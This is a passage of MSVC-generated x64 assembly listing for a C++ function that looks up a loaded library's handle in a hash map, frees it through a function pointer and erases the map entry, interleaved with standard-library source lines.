$LN236@FreeUsedLi:
	call	??3@YAXPEAX_K@Z				; operator delete
$LN222@FreeUsedLi:
	xor	eax, eax
	jmp	$LN816@FreeUsedLi
$LN2@FreeUsedLi:

; 90   : 	HMODULE module = _loadedLibs.find(_lower(lib).c_str())->second;

	mov	rdx, rsi
	lea	rcx, QWORD PTR $T9[rbp-169]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	lea	rcx, QWORD PTR $T3[rsp]
	call	?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z ; ProcessUtilities::_lower
	npad	1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rax+24], 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN246@FreeUsedLi

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rax, QWORD PTR [rax]
$LN246@FreeUsedLi:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 90   : 	HMODULE module = _loadedLibs.find(_lower(lib).c_str())->second;

	mov	rdx, rax
	lea	rcx, QWORD PTR $T6[rbp-169]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2235 :         const value_type* _Result = _Bx._Buf;

	lea	r8, QWORD PTR $T6[rbp-169]

; 2236 :         if (_Large_mode_engaged()) {

	mov	r14, QWORD PTR $T6[rbp-169]

; 2244 :         return _Myres > _Small_string_capacity;

	mov	r13, QWORD PTR $T6[rbp-145]
	cmp	r13, 15

; 2236 :         if (_Large_mode_engaged()) {

	cmova	r8, r14
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2333 :     return _Fnv1a_append_bytes(

	mov	rcx, r12
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	xor	edx, edx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	mov	rdi, QWORD PTR $T6[rbp-153]
	test	rdi, rdi
	je	SHORT $LN278@FreeUsedLi
	mov	r9, 1099511628211			; 00000100000001b3H
	npad	8
$LL792@FreeUsedLi:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	eax, BYTE PTR [rdx+r8]
	xor	rcx, rax

; 2302 :         _Val *= _FNV_prime;

	imul	rcx, r9

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	inc	rdx
	cmp	rdx, rdi
	jb	SHORT $LL792@FreeUsedLi
$LN278@FreeUsedLi:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1564 :         const size_type _Bucket = _Hashval & _Mask;

	and	rcx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+48

; 1565 :         _Nodeptr _Where         = _Vec._Mypair._Myval2._Myfirst[(_Bucket << 1) + 1]._Ptr;

	add	rcx, rcx
	mov	rax, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24
	mov	rbx, QWORD PTR [rax+rcx*8+8]

; 1566 :         const _Nodeptr _End     = _List._Mypair._Myval2._Myhead;
; 1567 :         if (_Where == _End) {

	mov	rdx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
	cmp	rbx, rdx
	je	SHORT $LN817@FreeUsedLi

; 1568 :             return {_End, _Nodeptr{}};
; 1569 :         }
; 1570 : 
; 1571 :         const _Nodeptr _Bucket_lo = _Vec._Mypair._Myval2._Myfirst[_Bucket << 1]._Ptr;

	mov	r15, QWORD PTR [rax+rcx*8]
	npad	6
$LL286@FreeUsedLi:

; 1572 :         for (;;) {
; 1573 :             // Search backwards to maintain sorted [_Bucket_lo, _Bucket_hi] when !_Standard
; 1574 :             if (!_Traitsobj(_Keyval, _Traits::_Kfn(_Where->_Myval))) {

	lea	rdx, QWORD PTR [rbx+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	rax, QWORD PTR [rdx+16]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+24], 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN306@FreeUsedLi

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdx, QWORD PTR [rdx]
$LN306@FreeUsedLi:

; 2235 :         const value_type* _Result = _Bx._Buf;

	lea	rcx, QWORD PTR $T6[rbp-169]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	r13, 15

; 2236 :         if (_Large_mode_engaged()) {

	cmova	rcx, r14

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	cmp	rdi, rax
	jne	SHORT $LN321@FreeUsedLi

; 379  :         return __builtin_memcmp(_First1, _First2, _Count);

	mov	r8, rdi
	call	memcmp

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	test	eax, eax
	je	SHORT $LN783@FreeUsedLi
$LN321@FreeUsedLi:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1584 :             if (_Where == _Bucket_lo) {

	cmp	rbx, r15
	je	SHORT $LN784@FreeUsedLi

; 1586 :             }
; 1587 : 
; 1588 :             _Where = _Where->_Prev;

	mov	rbx, QWORD PTR [rbx+8]

; 1589 :         }

	jmp	SHORT $LL286@FreeUsedLi
$LN783@FreeUsedLi:

; 1575 :                 if constexpr (!_Traits::_Standard) {
; 1576 :                     if (_Traitsobj(_Traits::_Kfn(_Where->_Myval), _Keyval)) {
; 1577 :                         return {_Where->_Next, _Nodeptr{}};
; 1578 :                     }
; 1579 :                 }
; 1580 : 
; 1581 :                 return {_Where->_Next, _Where};

	mov	rdx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
	jmp	SHORT $LN287@FreeUsedLi
$LN784@FreeUsedLi:

; 1585 :                 return {_Where, _Nodeptr{}};

	mov	rdx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
$LN817@FreeUsedLi:

; 1214 :             if (_Target) {

	xor	ebx, ebx
$LN287@FreeUsedLi:
	test	rbx, rbx
	cmovne	rdx, rbx
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 90   : 	HMODULE module = _loadedLibs.find(_lower(lib).c_str())->second;

	mov	rbx, QWORD PTR [rdx+48]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	r13, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN365@FreeUsedLi

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	lea	rdx, QWORD PTR [r13+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rax, r14

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN379@FreeUsedLi

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r14, QWORD PTR [r14-8]
	sub	rax, r14

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	$LN825@FreeUsedLi
$LN379@FreeUsedLi:

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, r14
	call	??3@YAXPEAX_K@Z				; operator delete
	npad	1
$LN365@FreeUsedLi:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR $T3[rbp-145]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN402@FreeUsedLi

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR $T3[rsp]
	mov	rax, rcx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN416@FreeUsedLi

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rcx-8]
	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	$LN826@FreeUsedLi
$LN416@FreeUsedLi:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN402@FreeUsedLi:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	movdqa	xmm0, XMMWORD PTR __xmm@000000000000000f0000000000000000
	movdqu	XMMWORD PTR $T3[rbp-153], xmm0

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR $T3[rsp], 0
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 92   : 	if ( !_FreeLibrary(module) )

	mov	rax, QWORD PTR ?_FreeLibrary@@3P6AHPEAX@ZEA ; _FreeLibrary
	mov	rcx, rbx
	call	rax
	test	eax, eax
	je	$LN821@FreeUsedLi

; 95   : 	_loadedLibs.erase(_lower(lib).c_str());

	mov	rdx, rsi
	lea	rcx, QWORD PTR $T8[rbp-169]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	lea	rcx, QWORD PTR $T2[rsp]
	call	?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z ; ProcessUtilities::_lower
	npad	1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rax+24], 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN463@FreeUsedLi

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rax, QWORD PTR [rax]
$LN463@FreeUsedLi:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 95   : 	_loadedLibs.erase(_lower(lib).c_str());

	mov	rdx, rax
	lea	rcx, QWORD PTR $T7[rbp-169]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2235 :         const value_type* _Result = _Bx._Buf;

	lea	rdx, QWORD PTR $T7[rbp-169]

; 2236 :         if (_Large_mode_engaged()) {

	mov	r13, QWORD PTR $T7[rbp-169]

; 2244 :         return _Myres > _Small_string_capacity;

	mov	r8, QWORD PTR $T7[rbp-145]
	mov	QWORD PTR $T1[rsp], r8
	cmp	r8, 15

; 2236 :         if (_Large_mode_engaged()) {

	cmova	rdx, r13

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	xor	ecx, ecx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	mov	rdi, QWORD PTR $T7[rbp-153]
	test	rdi, rdi
	je	SHORT $LN500@FreeUsedLi
	mov	r8, 1099511628211			; 00000100000001b3H
	npad	1
$LL794@FreeUsedLi:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	eax, BYTE PTR [rcx+rdx]
	xor	r12, rax

; 2302 :         _Val *= _FNV_prime;

	imul	r12, r8

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	inc	rcx
	cmp	rcx, rdi
	jb	SHORT $LL794@FreeUsedLi
	mov	r8, QWORD PTR $T1[rsp]
$LN500@FreeUsedLi:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1564 :         const size_type _Bucket = _Hashval & _Mask;

	and	r12, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+48

; 1565 :         _Nodeptr _Where         = _Vec._Mypair._Myval2._Myfirst[(_Bucket << 1) + 1]._Ptr;

	shl	r12, 4
	mov	r14, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24
	add	r14, r12
	mov	rbx, QWORD PTR [r14+8]

; 1566 :         const _Nodeptr _End     = _List._Mypair._Myval2._Myhead;
; 1567 :         if (_Where == _End) {

	mov	r12, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
	cmp	rbx, r12
	je	SHORT $LN786@FreeUsedLi

; 1568 :             return {_End, _Nodeptr{}};
; 1569 :         }
; 1570 : 
; 1571 :         const _Nodeptr _Bucket_lo = _Vec._Mypair._Myval2._Myfirst[_Bucket << 1]._Ptr;

	mov	r15, QWORD PTR [r14]
$LL505@FreeUsedLi:

; 1572 :         for (;;) {
; 1573 :             // Search backwards to maintain sorted [_Bucket_lo, _Bucket_hi] when !_Standard
; 1574 :             if (!_Traitsobj(_Keyval, _Traits::_Kfn(_Where->_Myval))) {

	lea	rdx, QWORD PTR [rbx+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	rax, QWORD PTR [rdx+16]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+24], 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN525@FreeUsedLi

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdx, QWORD PTR [rdx]
$LN525@FreeUsedLi:

; 2235 :         const value_type* _Result = _Bx._Buf;

	lea	rcx, QWORD PTR $T7[rbp-169]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	r8, 15

; 2236 :         if (_Large_mode_engaged()) {

	cmova	rcx, r13

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	cmp	rdi, rax
	jne	SHORT $LN540@FreeUsedLi

; 379  :         return __builtin_memcmp(_First1, _First2, _Count);

	mov	r8, rdi
	call	memcmp

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	test	eax, eax
	je	SHORT $LN506@FreeUsedLi
	mov	r8, QWORD PTR $T1[rsp]
$LN540@FreeUsedLi:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1584 :             if (_Where == _Bucket_lo) {

	cmp	rbx, r15
	je	SHORT $LN786@FreeUsedLi

; 1586 :             }
; 1587 : 
; 1588 :             _Where = _Where->_Prev;

	mov	rbx, QWORD PTR [rbx+8]

; 1589 :         }

	jmp	SHORT $LL505@FreeUsedLi
$LN786@FreeUsedLi:

; 1109 :             const auto _Target = _Find_last(_Keyval, _Hashval)._Duplicate;

	xor	ebx, ebx
$LN506@FreeUsedLi:
	test	rbx, rbx

; 1110 :             if (_Target) {

	je	$LN643@FreeUsedLi

; 1665 :         if (_Bucket_hi == _Plist) {

	mov	rax, QWORD PTR [r14]
	cmp	QWORD PTR [r14+8], rbx
	jne	SHORT $LN547@FreeUsedLi

; 1666 :             if (_Bucket_lo == _Plist) { // make bucket empty

	cmp	rax, rbx
	jne	SHORT $LN549@FreeUsedLi

; 1667 :                 const auto _End = _List._Mypair._Myval2._Myhead;
; 1668 : 
; 1669 :                 _Bucket_lo = _End;

	mov	QWORD PTR [r14], r12

; 1673 :             }

	mov	QWORD PTR [r14+8], r12
	jmp	SHORT $LN551@FreeUsedLi
$LN549@FreeUsedLi:

; 1670 :                 _Bucket_hi = _End;
; 1671 :             } else {
; 1672 :                 _Bucket_hi = _Plist->_Prev; // move end back one element

	mov	r12, QWORD PTR [rbx+8]

; 1673 :             }

	mov	QWORD PTR [r14+8], r12
	jmp	SHORT $LN551@FreeUsedLi
$LN547@FreeUsedLi:

; 1674 :         } else if (_Bucket_lo == _Plist) {

	cmp	rax, rbx
	jne	SHORT $LN551@FreeUsedLi

; 1675 :             _Bucket_lo = _Plist->_Next; // move beginning up one element

	mov	rax, QWORD PTR [rbx]
	mov	QWORD PTR [r14], rax
$LN551@FreeUsedLi:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 1423 :         const auto _Result = _Pnode->_Next;

	mov	rcx, QWORD PTR [rbx]

; 1424 :         _Mypair._Myval2._Orphan_ptr2(_Pnode);
; 1425 :         --_Mypair._Myval2._Mysize;

	dec	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+16

; 1426 :         _Pnode->_Prev->_Next = _Result;

	mov	rax, QWORD PTR [rbx+8]
	mov	QWORD PTR [rax], rcx

; 1427 :         _Result->_Prev       = _Pnode->_Prev;

	mov	rax, QWORD PTR [rbx+8]
	mov	QWORD PTR [rcx+8], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rbx+40]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN591@FreeUsedLi

; 4869 :             _ASAN_STRING_REMOVE(*this);
; 4870 :             auto& _Al = _Getal();
; 4871 :             _Deallocate_for_capacity(_Al, _My_data._Bx._Ptr, _My_data._Myres);

	mov	rcx, QWORD PTR [rbx+16]

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN605@FreeUsedLi

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	$LN691@FreeUsedLi

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN605@FreeUsedLi:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN591@FreeUsedLi:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rbx+32], 0

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+40], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rbx+16], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	edx, 56					; 00000038H
	mov	rcx, rbx
	call	??3@YAXPEAX_K@Z				; operator delete
$LN643@FreeUsedLi:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR $T1[rsp]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN680@FreeUsedLi

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rax, r13

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN694@FreeUsedLi

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r13, QWORD PTR [r13-8]
	sub	rax, r13

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	$LN691@FreeUsedLi
$LN694@FreeUsedLi:

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, r13
	call	??3@YAXPEAX_K@Z				; operator delete
	npad	1
$LN680@FreeUsedLi:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR $T2[rbp-145]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN717@FreeUsedLi

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR $T2[rsp]
	mov	rax, rcx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN731@FreeUsedLi

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rcx-8]
	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	$LN827@FreeUsedLi
$LN731@FreeUsedLi:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
	npad	1
$LN717@FreeUsedLi:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rsi+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN754@FreeUsedLi

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
